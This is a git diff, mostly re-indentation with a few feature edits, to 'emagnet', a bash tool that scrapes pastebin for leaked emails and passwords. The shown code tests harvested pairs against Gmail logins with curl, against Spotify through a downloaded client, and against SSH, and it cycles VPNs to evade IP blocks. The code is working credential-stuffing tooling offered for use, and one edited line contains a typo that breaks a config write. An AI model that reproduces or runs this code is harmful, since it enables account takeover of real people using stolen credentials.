@@ -89,7 +89,8 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
   -s, --spam          Send an email to all email addresses
   -q, --quiet         Run emagnet in a screen
   -x, --syntax        Download uploads sorted by syntax
-                       - Syntaxes available on pastebin.com/languages
+                       - Valid syntaxes available on pastebin.com/languages
+
 EOF
 }
 
@@ -219,12 +220,12 @@ INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"
         done
     fi
 
-if [[ "$NRESESSIONS" -lt "3" ]]; then
+ if [[ "$NRESESSIONS" -lt "3" ]]; then
      echo -e "$basename$0: internal error -- 0 emagnet sessions is currently running"
-else
+  else
      echo -e "$basename$0: killed $(echo $NRESESSIONS-2|bc) emagnet sessions"
      kill -SIGKILL "$ESESSIONS" &> /dev/null
-fi
+ fi
 }
 
 emagnet_backup() {
@@ -335,6 +336,23 @@ fi
   fi
 }
 
+emagnet_time() {
+
+                  if [[ -z "$2" ]]; then
+                       echo "emagnet: internal error -- time require a number to be used"
+                       exit 1
+                  fi
+
+                        re='^[0-9]+$'
+                        if ! [[ $2 =~ $re ]] ; then
+                               echo -e "emagnet: internal error -- that's not a valid number" >&2; exit 1
+                        fi
+                                   sed -i '30d' "$CONF"
+                                   sed -i "30 i TIME=$2" "$CONF"
+                                   printf "emagnet: config file has been updated -- time has been set to: $2 seconds\n"
+                                   exit 1
+}
+
 emagnet_heavyload() {
 emagnet_conf
  if [[ -z "$USERAGENT" ]]; then
@@ -379,23 +397,23 @@ emagnet_banner
      			   wait_time=${IDLETIME}
       		           temp_cnt=${wait_time}
    				while [[ "${temp_cnt}" -gt "0" ]]; do
-                printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
-      					printf " seconds"
-      					sleep 1
-      					((temp_cnt--))
-  			  done
-                printf "\n"
-                emagnet_clear
-                emagnet_banner
-                bash "$basename$0" --emagnet
-                sleep 2
-       done
-                emagnet_clear
-                emagnet_banner
-                bash "$basename$0" --emagnet
+                                  printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
+      			          printf " seconds"
+      				  sleep 1
+      		                  ((temp_cnt--))
+  	                        done
+                                    printf "\n"
+                                       emagnet_clear
+                                       emagnet_banner
+                                    bash "$basename$0" --emagnet
+                                   sleep 2
+                          done
+         emagnet_clear
+         emagnet_banner
+        bash "$basename$0" --emagnet
                 exit
       else
-                emagnet_banned
+         emagnet_banned
   fi
 fi
 }
@@ -446,7 +464,7 @@ else
   MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"
   COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' $CONF|sed 's/"//g'|tr ' ' '\n'|shuf -n1)
 
-  curl -H "$USERAGENT"-Ls "$WIP" > "/tmp/.emagnet-ip"
+  curl -H "$USERAGENT" -Ls "$WIP" > "/tmp/.emagnet-ip"
 
       if [[ -n "$OPENVPNRUNNING" ]]; then
          pkill -9 "openvpn"
@@ -461,7 +479,8 @@ printf "\n"
         sleep 10
         MYIP="$(curl -s https://nr1.nu/i/)"
         MYOLDIP="$(cat /tmp/.emagnet-ip)"
-            if [[ "$MYIP" != "$MYOLDIP" ]]; then
+        
+	    if [[ "$MYIP" != "$MYOLDIP" ]]; then
                  MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
                      printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
                      printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
@@ -471,7 +490,8 @@ printf "\n"
                      if [[ "$MYIP" = "$MYOLDIP" ]]; then
                          echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
                          sleep 10
-                             if [[ ! $MYIP = "$MYOLDIP" ]]; then
+            
+			     if [[ ! $MYIP = "$MYOLDIP" ]]; then
                                 MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
                                 printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
                                 printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
@@ -487,6 +507,7 @@ printf "\n"
 emagnet_analyzing_message() {
     text="Analyzing..."
     delay="0.1"
+
         printf "%26s"; for analyzing in $(seq 0 $(expr length "${text}"))
 		         do
                  	     echo -n "${text:$analyzing:1}"
@@ -508,32 +529,33 @@ TOTM="$(cat /opt/emagnet/incoming/*/logs/emails-from-pastebin.txt|wc -l)"       
 TOTP="$(cat /opt/emagnet/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # Total passwords
 TOTU="$(cat /opt/emagnet/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
 
-	emagnet_clear
-	emagnet_banner
-
-    printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
+	  emagnet_clear
+          emagnet_banner
+          printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
 	  printf "%64s \n\n" | tr ' ' '='
 
-for LOGDATE in "$(ls /opt/emagnet/incoming/)"; do
-  echo -e ",-> Merging logs from: $LOGDATE \n|"
-     for logfiles in cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt; do
-           for files in "$logfiles"; do
-             touch "/opt/emagnet/archive/logs/$logfiles" &> /dev/null
-           done
-              cat "/opt/emagnet/incoming/$LOGDATE/logs/$logfiles" >> "/opt/emagnet/archive/logs/$logfiles" &> /dev/null
-                  if [[ "$?" -eq "0" ]]; then
-                    printf "| %2d) [MERGED] %.31s %s" "$(( ++cnt ))" "$logfiles ............................. "
-             	    printf  "> archive/$logfiles\n"
-                   else
-		    printf "| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logfiles ............................. "
-               	    printf  "> archive/$logfiles\n"
-                  fi
-        sleep 0.2
-    done
- printf "|\n"
- sleep 0.2
-done
-	printf "'- Successfully merged \e[1;32m${TOTM}\e[0m emails, \e[1;34m${TOTP}\e[0m passwords and \e[1;36m${TOTU}\e[0m urls...\n\n"
+             for LOGDATE in "$(ls /opt/emagnet/incoming/)"; do
+                echo -e ",-> Merging logs from: $LOGDATE \n|"
+                  for logfiles in cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt; do
+                    for files in "$logfiles"; do
+                      touch "/opt/emagnet/archive/logs/$logfiles" &> /dev/null
+                    done
+
+                       cat "/opt/emagnet/incoming/$LOGDATE/logs/$logfiles" >> "/opt/emagnet/archive/logs/$logfiles" &> /dev/null
+
+                            if [[ "$?" -eq "0" ]]; then
+                                 printf "| %2d) [MERGED] %.31s %s" "$(( ++cnt ))" "$logfiles ............................. "
+             	                 printf  "> archive/$logfiles\n"
+                             else
+		                 printf "| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logfiles ............................. "
+               	                 printf  "> archive/$logfiles\n"
+                            fi
+                                sleep 0.2
+                 done
+                   printf "|\n"
+                   sleep 0.2
+              done
+                         printf "'- Successfully merged \e[1;32m${TOTM}\e[0m emails, \e[1;34m${TOTP}\e[0m passwords and \e[1;36m${TOTU}\e[0m urls...\n\n"
 }
 
 emagnet_analyzer() {
@@ -559,68 +581,84 @@ if [[ "$EMPTY" -lt "5" ]]; then
 fi
 
   if [[ ! -d "$EMAGNETARCHIVE/emagnet" ]]; then
-    mkdir -p "$EMAGNETARCHIVE/{all-files,email-files,password-files,logs}"
+    mkdir -p "$EMAGNETARCHIVE/all-files"
+    mkdir -p "$EMAGNETARCHIVE/email-files"
+    mkdir -p "$EMAGNETARCHIVE/password-files"
+    mkdir -p "$EMAGNETARCHIVE/logs"
   fi
 
-  emagnet_clear
-  emagnet_banner
-  printf "%s\n" "Copying files to archive.."
-    	cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
-    	cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
-   	cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
-  printf "%s\n\n" "All files has been copied to archive.."
+    emagnet_clear
+    emagnet_banner
+
+        printf "%s\n" "Copying files to archive.."
+     	  cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
+     	  cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
+    	  cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
+        printf "%s\n\n" "All files has been copied to archive.."
 
 
 read -p "Do you want to wipe incoming directories (y/n): " cleanup
    if [[ $cleanup = "y" ]]; then
       rm -rf $EMAGNET/incoming/
       printf "\e[1;31mWiping\e[0m $EMAGNET/incoming..\nDone\n\n"
-    else
-     printf "\nAborted.\n\n"
+     else
+      printf "\nAborted.\n\n"
    fi
 }
 
 emagnet_count_down() {
 emagnet_conf
+emagnet_paths
+
 if [[ "$GBRUTEFORCE" = "true" ]]; then
-      	  sed -i '118d' "$CONF"
-      	  sed -i '118 i GBRUTEFORCE=true' "$CONF"
-          sed -i '120d' "$CONF"
-      	  sed -i '120 i PBRUTEFORCE=false' "$CONF"
-           emagnet_conf
-          printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-          printf "\n%64s \n" | tr ' ' '='
-          echo
-           emagnet_analyzer
-  elif [[ "$PBRUTEFORCE" = "true" ]]; then
-      		sed -i '118d' "$CONF"
+       	    sed -i '118d' "$CONF"
+      	    sed -i '118 i GBRUTEFORCE=true' "$CONF"
+      	    sed -i '119d' "$CONF"
+      	    sed -i '119 i SBRUTEFORCE=false' "$CONF"
+            sed -i '120d' "$CONF"
+      	    sed -i '120 i PBRUTEFORCE=false' "$CONF"
+             emagnet_conf
+              printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+              printf "\n%64s \n\n" | tr ' ' '='
+             emagnet_analyzer
+	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
+      	    sed -i '118d' "$CONF"
      	    sed -i '118 i GBRUTEFORCE=false' "$CONF"
-      		sed -i '120d' "$CONF"
-     		  sed -i '120 i PBRUTEFORCE=true' "$CONF"
-           emagnet_conf
-          printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-          printf "\n%64s \n\n" | tr ' ' '='
-          emagnet_analyzer
-  else
-          sed -i '118d' "$CONF"
-          sed -i '118 i GBRUTEFORCE=false' "$CONF"
-          sed -i '120d' "$CONF"
-          sed -i '120 i PBRUTEFORCE=false' "$CONF"
-           emagnet_conf
-           emagnet_analyzer
+      	    sed -i '119d' "$CONF"
+	    sed -i '119 i SBRUTEFORCE=true' I"$CONF"
+	    sed -i '120d' "$CONF"
+     	    sed -i '120 i PBRUTEFORCE=false' "$CONF"
+            emagnet_conf
+            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+            printf "\n%64s \n\n" | tr ' ' '='
+            emagnet_analyzer
+	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
+	    sed -i '118d' "$CONF"
+     	    sed -i '118 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '119d' "$CONF"
+     	    sed -i '119 i SBRUTEFORCE=false' "$CONF"
+            sed -i '120d' "$CONF"
+     	    sed -i '120 i PBRUTEFORCE=true' "$CONF"
+            emagnet_conf
+            printf "%18s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+            printf "\n%64s \n\n" | tr ' ' '='
+            emagnet_analyzer
+	  else
+            sed -i '118d' "$CONF"
+            sed -i '118 i GBRUTEFORCE=false' "$CONF"
+            sed -i '118d' "$CONF"
+            sed -i '118 i SBRUTEFORCE=false' "$CONF"
+            sed -i '120d' "$CONF"
+            sed -i '120 i PBRUTEFORCE=false' "$CONF"
+            emagnet_conf
+            emagnet_analyzer
 fi
 }
 
 blocked() {
 emagnet_conf
-  if [[ -z "$USERAGENT" ]]; then
-      echo -e "$basename$0: internal errror -- you must set a useragent in $CONF"
-      exit 1
-  fi
-
-  if ! [[ -s "/tmp/.emagnet" ]]; then
-        curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > /tmp/.emagnet
-  fi
+ if [[ -z "$USERAGENT" ]]; then echo -e "$basename$0: internal errror -- you must set a useragent in $CONF";exit 1;fi
+ if ! [[ -s "/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > /tmp/.emagnet;fi
 }
 
 emagnet_spotify_bruter() {
@@ -636,12 +674,12 @@ SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> /tmp/.emagnet-passwords.txt
 
 	     while read line; do
-      	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
-      	SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-	       ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
-	          if [[ "$?" -eq "0" ]]; then
-        	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-                   else
+               	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
+      	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
+	          ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+	             if [[ "$?" -eq "0" ]]; then
+        	        echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
+                     else
               		echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
             		echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              		echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
@@ -649,13 +687,13 @@ SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
              		echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
               		echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              		echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-          	  fi
-       done < "/tmp/.emagnet-passwords.txt"
+                     fi
+             done < "/tmp/.emagnet-passwords.txt"
 }
 
 emagnet_gmail_bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
-    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 
+grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 
 
 while read -r line; do
 attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
@@ -849,7 +887,6 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
    ((10#0$it > 00))
    ((10#0$pt > 00))
 
-
 if [[ "$it" -gt "00" ]] && [[ "$pt" -gt "00" ]]; then
 
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found: ${pt} passwords from: $EMAGNETPW/${i##*/}" | xargs >> "$EMAGNETLOGS/emagnet.log"
@@ -1024,25 +1061,25 @@ case $1 in
 		  ;;
 
       "-g"|"-bruteforce"|"--bruteforce")
-          sleep 0.5
-               if [[ $2 = "gmail" ]]; then
-                  sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
-                  emagnet_conf
-                       if [[ $GBRUTEFORCE = "true" ]]; then
-                          emagnet_run4ever
-                          emagnet_gmail_bruter
-                          mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-                       fi
+          sleep 0.2
+          if [[ $2 = "gmail" ]]; then
+             sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
+               emagnet_conf
+                if [[ $GBRUTEFORCE = "true" ]]; then
+                   emagnet_run4ever
+                   emagnet_gmail_bruter
+                   mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+                 fi
  
-                       elif [[ $2 = "ssh" ]]; then
-                         hash "parallel" &> /dev/null
-                          if [[ "$?" -ne "0" ]]; then
-                            echo -e "$basename$0: internal error -- parallel package is required to be installed.."
-                            exit 1
-                           fi
-             emagnet_conf
-       	     sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
-                           emagnet_conf
+	    elif [[ $2 = "ssh" ]]; then
+              hash "parallel" &> /dev/null
+                 if [[ "$?" -ne "0" ]]; then
+                     echo -e "$basename$0: internal error -- parallel package is required to be installed.."
+                     exit 1
+                 fi
+                emagnet_conf
+       	      sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' "$CONF"
+              emagnet_conf
 
             if [[ $SBRUTEFORCE = "true" ]]; then
                		 emagnet_run4ever
@@ -1050,26 +1087,25 @@ case $1 in
             fi
                 	mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
 
-   elif [[ $2 = "spotify" ]]; then
-         emagnet_conf
-         find /usr/include -type d |grep 'libspotify' &> /dev/null
-                  if [[ "$?" -ne "0" ]]; then
-                  	 if [[ -z "$LIBSPOTIFY" ]]; then
-	                            printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
-         		                  read LIBSPOTIFY
-                          			 if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
-        				                      echo "Can't continue until libspotify has been installed.."
-      					                      echo "Exiting.."
-       					                      exit 1
-         			                   fi
-                                               sed -i '210d' "$CONF"
-                                               sed -i '210 i LIBSPOTIFY=true' "$CONF"
-                     fi
-
-                 else
-        	            sed -i '210d' "$CONF"
+           elif [[ $2 = "spotify" ]]; then
+               emagnet_conf
+             find /usr/include -type d |grep 'libspotify' &> /dev/null
+                if [[ "$?" -ne "0" ]]; then
+                  if [[ -z "$LIBSPOTIFY" ]]; then
+	             printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
+                     read LIBSPOTIFY
+                       if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
+        	          echo "Can't continue until libspotify has been installed.."
+      		          echo "Exiting.."
+       		          exit 1
+         	       fi
+                     sed -i '210d' "$CONF"
+                     sed -i '210 i LIBSPOTIFY=true' "$CONF"
+                  fi
+                else
+                      sed -i '210d' "$CONF"
                       sed -i '210 i LIBSPOTIFY=true' "$CONF"
-                 fi
+                fi
 
             ./sconsify -version &> /dev/null
                 if [[ $? -ne "0" ]]; then
@@ -1079,13 +1115,13 @@ case $1 in
                                 echo -e "Hold on, downloading sconsify.." 
                                 wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                                 echo -e "Unzipping sconsify into current dir.."
-                                  unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-                                  chmod +x ./sconsify
+                                unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
+                                chmod +x ./sconsify
                                 echo -e "Cleaning up."..
-                                  rm "linux-x86_64-sconsify-0.6.0-next.zip"
-                                echo "All done, going to continue in 3 seconds.."
-                                  sleep 3
-                            else
+                                rm "linux-x86_64-sconsify-0.6.0-next.zip"
+                                echo "All done.."
+                                sleep 2
+                             else
                                echo -e "$basename$0: internal error -- sconsify is required to be installed.."
                                exit 1
                             fi
@@ -1094,14 +1130,14 @@ case $1 in
                         emagnet_conf
 
                  if [[ "$PBRUTEFORCE" = "true" ]]; then
-                                emagnet_clear
-                                emagnet_banner
-                                  printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
-                                  printf "\n%64s \n\n" | tr ' ' '='
-                                emagnet_run4ever
-                                  printf "\n%64s \n\n" | tr ' ' '='
-                                emagnet_spotify_bruter
-                        fi
+                                  emagnet_clear
+                                  emagnet_banner
+                                printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+                                printf "\n%64s \n\n" | tr ' ' '='
+                                  emagnet_run4ever
+                                printf "\n%64s \n\n" | tr ' ' '='
+                                  emagnet_spotify_bruter
+                 fi
                                 mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                 else
                        printf "%s\n" "$basename$0: internal error -- unknown option"
@@ -1109,28 +1145,28 @@ case $1 in
                 fi
                 ;;
 
-      "-k"|"-kill"|"--kill") 
-                emagnet_kill 
+      "-k"|"-kill"|"--kill")
+                emagnet_kill
                 ;;
 
-      "-i"|"--ip"|"-ip"|"ip") 
+      "-i"|"--ip"|"-ip"|"ip")
                 emagnet_iconnection
-                echo -e "iPV4: $(curl -s https://nr1.nu/i/)"                                     
+                echo -e "iPV4: $(curl -s https://nr1.nu/i/)"
                 ;;
 
-      "-h"|"--help"|"-help"|"help") 
-                emagnet_usage  
+      "-h"|"--help"|"-help"|"help")
+                emagnet_usage
                 ;;
 
-      "-l"|"-license"|"--license") 
-                emagnet_license                                                             
+      "-l"|"-license"|"--license")
+                emagnet_license
                 ;;
 
       "-m"|"-merge"|"--merge")
                 emagnet_conf
                 emagnet_merge
                 ;;
-      
+
       "-M"|"-move"|"--move") 
                 emagnet_conf
                 emagnet_move_files
@@ -1153,25 +1189,12 @@ case $1 in
 
       "version"|"-version"|"--version"|"-V")  
                 VERSION="$(cat /etc/emagnet.conf|grep "^VERSION"|cut -d= -f2)"
-                printf "Emagnet Version: $VERSION\n" 			 
-                 ;;
+                printf "Emagnet Version: $VERSION\n"
+                ;;
 
       "-t"|"-time"|"--time")
                  emagnet_conf
-
-                  if [[ -z "$2" ]]; then
-                       echo "emagnet: internal error -- time require a number to be used"
-                       exit 1
-                  fi
-
-                        re='^[0-9]+$'
-                        if ! [[ $2 =~ $re ]] ; then
-                               echo -e "emagnet: internal error -- that's not a valid number" >&2; exit 1
-                        fi
-                                   sed -i '30d' "$CONF"
-                                   sed -i "30 i TIME=$2" "$CONF"
-                                   printf "emagnet: config file has been updated -- time has been set to: $2 seconds\n"
-                                   exit 1
+                 emagnet_time
                   ;;
 
         "-n"|"-notify"|"--notify")
@@ -1187,18 +1210,18 @@ case $1 in
  				                  echo -e "$basename$0: internal error -- you must use true or false"
       				            exit 1
 			                  fi
-				   
-                               if [[ $? -eq "0" ]] && [[ $2 = "true" ]]; then
-    					                      sed -i '137d' "$CONF"
-      				                      sed -i "137 i NOTIFY=true" "$CONF"
-        				                    printf "$basename$0: config file has been updated -- notifications has been enable\n"
-     				                   fi
+
+                                                if [[ $? -eq "0" ]] && [[ $2 = "true" ]]; then
+                                              	  sed -i '137d' "$CONF"
+      		                               	  sed -i "137 i NOTIFY=true" "$CONF"
+        				       	  printf "$basename$0: config file has been updated -- notifications has been enable\n"
+     				                fi
 
 				                             if [[ $? -eq "0" ]] && [[ $2 = "false" ]]; then
       					                            sed -i '137d' "$CONF"
        					                            sed -i "137 i NOTIFY=false" "$CONF"
         				                            printf "$basename$0: config file has been updated -- notifications has been disable\n"
-     				                          fi
+     				                             fi
                   ;;
 
         "-v"|"-vpn"|"--vpn")
@@ -1212,7 +1235,7 @@ case $1 in
                           echo -e "emagnet: internal error -- set to true or false?"
                           exit 1
                         fi
-                                
+
                                 if [[ "$2" = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then
                                      sed -i '150d' "$CONF";sed -i "150i VPN=true" "$CONF"
                                      echo -e "emagnet: config file has been updated -- vpn has been enabled"
@@ -1230,7 +1253,7 @@ case $1 in
             "-b"|"-backup"|"--backup")
                 emagnet_backup
                 ;;
-        
+
 	"\?")
               emagnet_clear
               emagnet_banner
